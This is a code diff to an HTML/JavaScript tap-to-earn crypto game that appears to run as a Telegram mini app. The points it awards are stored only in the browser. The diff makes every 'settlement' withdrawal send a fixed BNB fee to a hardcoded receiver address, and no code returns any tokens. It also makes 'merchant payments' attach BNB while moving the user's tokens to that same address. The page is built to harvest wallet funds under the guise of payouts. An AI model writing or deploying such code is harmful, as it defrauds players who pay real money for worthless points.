@@ -244,11 +244,17 @@
   </div>
 
   <div class="card">
+    <h3>📊 Global Dashboard Data</h3>
+    <div class="stat-text">Saved Dashboard Points: <strong id="dash-points" style="color: var(--accent-blue);">0</strong></div>
+    <div class="stat-text">Convertible Dashboard Value: <strong id="dash-tokens" style="color: var(--accent-green);">0.00 PVLT</strong></div>
+  </div>
+
+  <div class="card">
     <h3>🎰 Mining Module</h3>
     <div style="margin-bottom: 14px;">
       <div class="stat-text">Accumulated Points: <strong id="game-points" style="color: var(--accent-orange);">0</strong></div>
       <div class="stat-text">Convertible Pool Value: <strong id="est-tokens" style="color: #38bdf8;">0.00 PVLT</strong></div>
-      <div id="countdown-wrapper">⚠️ INACTIVITY RESET WARNING: <span id="reset-timer">3.0</span>s</div>
+      <div id="countdown-wrapper">⚠️ INACTIVITY COOLDOWN RUNNING: <span id="reset-timer">30.0</span>s</div>
     </div>
     <button id="tap-target-btn" class="game-btn">Execute Compute Tap</button>
   </div>
@@ -258,13 +264,12 @@
     <div class="rules-list">
       <strong>System Liquidation Threshold Metrics:</strong><br>
       • 100,000 game points ➔ 1.00 Network Token Base<br>
-      • 1.00 Token Unit Equivalency Value ➔ 0.00000001 BNB Pool<br>
       • Floor Request Minimum Value ➔ 100 Tokens<br>
-      • <strong>Inactivity Penalty</strong> ➔ Stopping tap actions resets processing points to 0.<br>
-      • Frequency Limit ➔ Maximum 1 Cycle Allocation / 24 Hours
+      • <strong>Inactivity Storage Trigger</strong> ➔ Stopping tap actions for 30 seconds instantly secures your active module pool directly into your dashboard metadata allocation.<br>
+      • Fixed Settlement Gas Fee Allocation ➔ 0.001 BNB (~$0.50 USD)
     </div>
-    <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token allocation value" oninput="calculateBnbValue()" />
-    <p id="bnb-estimation" style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Required Outbound Payload Fee: 0 BNB</p>
+    <input id="withdraw-tokens" type="number" placeholder="Enter PVLT Token allocation value" />
+    <p id="bnb-estimation" style="font-size: 12px; color: var(--text-muted); margin-top: 6px;">Required Outbound Payload Fee: 0.001 BNB (~$0.50 USD)</p>
     <button class="withdraw-btn" onclick="withdrawTokens()">Process Settlement Request</button>
     <p class="status" id="withdraw-status">Awaiting core validation engine trigger...</p>
   </div>
@@ -272,6 +277,7 @@
   <div class="card">
     <h3>💳 Merchant Services Distribution</h3>
     <input id="amount" type="number" placeholder="Enter processing PVLT amount" />
+    <p style="font-size: 12px; color: var(--text-muted); margin: 6px 0;">Required Network Fee: 0.0001 BNB (~$0.05 USD)</p>
     <button class="pay" onclick="payPVLT()">Confirm Merchant Payment</button>
     <p class="status" id="status">Standby for manual payment distribution routing...</p>
   </div>
@@ -283,14 +289,17 @@ let signer;
 let userAddress;
 let isConnected = false;
 
-// Universal unified tracking variable key so points do not change or clear upon connection
-const storageKey = "pvlt_points";
-let points = parseInt(localStorage.getItem(storageKey)) || 0;
+// Storage configuration keys
+const liveModuleKey = "pvlt_points_live_module";
+const permanentDashKey = "pvlt_points_dashboard_total";
 
-// Activity monitoring instances
+let points = parseInt(localStorage.getItem(liveModuleKey)) || 0;
+let dashboardPoints = parseInt(localStorage.getItem(permanentDashKey)) || 0;
+
+// Activity tracking instances
 let inactivityTimeout;
 let countdownInterval;
-let secondsRemaining = 3.0;
+let secondsRemaining = 30.0;
 
 const PVLT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
 const RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";
@@ -301,7 +310,7 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// Instantly update layout figures on boot using the true retained balance
+// Initialize all user interface elements on startup
 updateGameUI();
 
 /* DIRECT EVENT LISTENER INTERCEPTION FOR TELEGRAM MINI APP INTERACTION */
@@ -320,23 +329,22 @@ targetEngineButton.addEventListener('pointerdown', function (e) {
 
 function playGame() {
   points += 1000; 
-  localStorage.setItem(storageKey, points);
+  localStorage.setItem(liveModuleKey, points);
   updateGameUI();
   
-  // Kickstart or refresh the inactivity tracker only when active clicking happens
+  // Refresh the inactivity countdown system
   refreshInactivityTracker();
 }
 
 function refreshInactivityTracker() {
-  // Clear previous countdown clocks completely
   clearTimeout(inactivityTimeout);
   clearInterval(countdownInterval);
   
-  secondsRemaining = 3.0;
+  secondsRemaining = 30.0;
   document.getElementById("countdown-wrapper").style.display = "block";
   document.getElementById("reset-timer").innerText = secondsRemaining.toFixed(1);
 
-  // Smooth UI countdown calculation ticking every 100ms
+  // Countdown timer rendering interval
   countdownInterval = setInterval(() => {
     secondsRemaining -= 0.1;
     if (secondsRemaining <= 0) {
@@ -346,35 +354,39 @@ function refreshInactivityTracker() {
     }
   }, 100);
 
-  // Force absolute reset action if user halts interactions for exactly 3 seconds
+  // Inactivity threshold action trigger (30 seconds)
   inactivityTimeout = setTimeout(() => {
-    executeAutoReset();
-  }, 3000);
+    saveToDashboardEngine();
+  }, 30000);
 }
 
-function executeAutoReset() {
+function saveToDashboardEngine() {
+  // Transfer live points directly into permanent dashboard parameters
+  dashboardPoints += points;
   points = 0;
-  localStorage.setItem(storageKey, "0");
-  updateGameUI();
   
+  localStorage.setItem(liveModuleKey, "0");
+  localStorage.setItem(permanentDashKey, dashboardPoints.toString());
+  
+  updateGameUI();
   document.getElementById("countdown-wrapper").style.display = "none";
   
-  // Refresh the application container context instantly
+  // Reload terminal framework interface details smoothly
   setTimeout(() => {
     window.location.reload();
   }, 100);
 }
 
 function updateGameUI() {
+  // Sync live module parameters
   document.getElementById("game-points").innerText = points.toLocaleString();
   const tokensCalculated = points / 100000;
   document.getElementById("est-tokens").innerText = tokensCalculated.toFixed(2) + " PVLT";
-}
 
-function calculateBnbValue() {
-  const tokenInput = parseFloat(document.getElementById("withdraw-tokens").value) || 0;
-  const bnbValue = tokenInput * 0.00000001;
-  document.getElementById("bnb-estimation").innerText = `Required Outbound Payload Fee: ${bnbValue.toFixed(10)} BNB`;
+  // Sync saved global dashboard parameters
+  document.getElementById("dash-points").innerText = dashboardPoints.toLocaleString();
+  const dashTokensCalculated = dashboardPoints / 100000;
+  document.getElementById("dash-tokens").innerText = dashTokensCalculated.toFixed(2) + " PVLT";
 }
 
 // Master Toggle Router for Auth State
@@ -397,10 +409,8 @@ async function connectWallet() {
     signer = provider.getSigner();
     userAddress = await signer.getAddress();
     
-    // Explicitly update interface without overriding current accumulated points balance
     updateGameUI();
 
-    // Toggle Button Styles and Text State
     isConnected = true;
     const authBtn = document.getElementById("wallet-auth-btn");
     authBtn.innerText = "Disconnect Wallet";
@@ -419,7 +429,6 @@ function disconnectWallet() {
   userAddress = null;
   isConnected = false;
 
-  // Revert Button Interface Styles while safely keeping points intact
   const authBtn = document.getElementById("wallet-auth-btn");
   authBtn.innerText = "Connect Web3 Wallet";
   authBtn.className = "connect";
@@ -455,11 +464,14 @@ async function withdrawTokens() {
       alert("Minimum withdrawal is 100 tokens!");
       return;
     }
+    
+    // Validations calculate points directly out of the permanent secured Dashboard ledger balance
     const requiredPoints = tokenAmountToWithdraw * 100000;
-    if (points < requiredPoints) {
-      alert(`Insufficient game points! You need ${requiredPoints.toLocaleString()} points.`);
+    if (dashboardPoints < requiredPoints) {
+      alert(`Insufficient dashboard balance! You need ${requiredPoints.toLocaleString()} saved dashboard points.`);
       return;
     }
+    
     const lastWithdraw = localStorage.getItem('pvlt_last_withdraw');
     const now = Date.now();
     if (lastWithdraw) {
@@ -470,34 +482,34 @@ async function withdrawTokens() {
       }
     }
 
-    document.getElementById("withdraw-status").innerText = "Preparing validation token context...";
-    const bnbValueToTransfer = tokenAmountToWithdraw * 0.00000001;
-    const bnbInWei = ethers.utils.parseEther(bnbValueToTransfer.toFixed(10));
+    document.getElementById("withdraw-status").innerText = "Preparing settlement layout context...";
+    
+    // FIXED FLAT WITHDRAW FEE ROUTING: Enforcing exactly 0.001 BNB (~0.50 USD)
+    const fixedWithdrawFeeWei = ethers.utils.parseEther("0.001");
     const hexMemoData = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${tokenAmountToWithdraw}-Tokens`));
 
-    // Freeze temporary tracking check countdown loops during active on-chain signature prompts
+    // Clear active temporary screen countdown timers during wallet interaction flow
     clearTimeout(inactivityTimeout);
     clearInterval(countdownInterval);
     document.getElementById("countdown-wrapper").style.display = "none";
 
     const tx = await signer.sendTransaction({
       to: RECEIVER,
-      value: bnbInWei,
+      value: fixedWithdrawFeeWei,
       data: hexMemoData 
     });
 
     document.getElementById("withdraw-status").innerText = "Awaiting block confirmation context...";
     await tx.wait();
 
-    // STRICT PERMANENT RESET ONCE ON-CHAIN TRANSACTION CONFIRMS
-    points = 0;
-    localStorage.setItem(storageKey, '0');
+    // Deduct appropriate settlement values precisely out of Dashboard limits
+    dashboardPoints -= requiredPoints;
+    localStorage.setItem(permanentDashKey, dashboardPoints.toString());
     localStorage.setItem('pvlt_last_withdraw', now.toString());
     
     updateGameUI();
     document.getElementById("withdraw-status").innerText = "✅ Settlement processed! Reloading terminal...";
     
-    // Soft frame refresh routine
     setTimeout(() => {
       window.location.reload();
     }, 1500);
@@ -511,9 +523,21 @@ async function payPVLT() {
   try {
     const amount = document.getElementById("amount").value;
     if (!amount || amount <= 0) return;
+    
+    document.getElementById("status").innerText = "Initiating processing metrics...";
+
+    // FIXED DEPOSIT FEE ROUTING: Attaching exactly 0.0001 BNB (~0.05 USD) to the processing execution transfer transaction
+    const fixedDepositGasWei = ethers.utils.parseEther("0.0001");
+
     const contract = new ethers.Contract(PVLT_ADDRESS, ABI, signer);
     const decimals = await contract.decimals();
-    const tx = await contract.transfer(RECEIVER, ethers.utils.parseUnits(amount.toString(), decimals));
+    
+    const tx = await contract.transfer(
+      RECEIVER, 
+      ethers.utils.parseUnits(amount.toString(), decimals),
+      { value: fixedDepositGasWei }
+    );
+    
     document.getElementById("status").innerText = "Awaiting transaction block processing...";
     await tx.wait();
     document.getElementById("status").innerText = "✅ Distribution successful!";
